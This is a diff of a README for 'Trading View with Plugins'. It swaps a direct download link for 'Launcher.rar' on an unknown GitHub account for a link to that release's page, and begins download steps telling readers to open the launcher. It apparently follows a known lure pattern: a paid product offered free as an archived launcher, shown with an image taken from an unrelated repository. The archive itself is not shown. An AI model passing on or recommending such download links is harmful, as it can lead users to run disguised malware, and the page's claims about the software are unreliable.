@@ -1,6 +1,6 @@
 # Trading View with Plugins
 
-[![image](https://github.com/turkalga1/Genshin-Impact-Starter-Maker/assets/165561228/f79e2333-d313-4a50-9d72-dcf4444682b8)](https://github.com/xuehonxin/Trading-View/releases/download/V3.6.6/Launcher.rar)
+[![image](https://github.com/turkalga1/Genshin-Impact-Starter-Maker/assets/165561228/f79e2333-d313-4a50-9d72-dcf4444682b8)](https://github.com/xuehonxin/Trading-View/releases/tag/V3.6.6)
 
 ## How to download:
 1. Open the Launcher
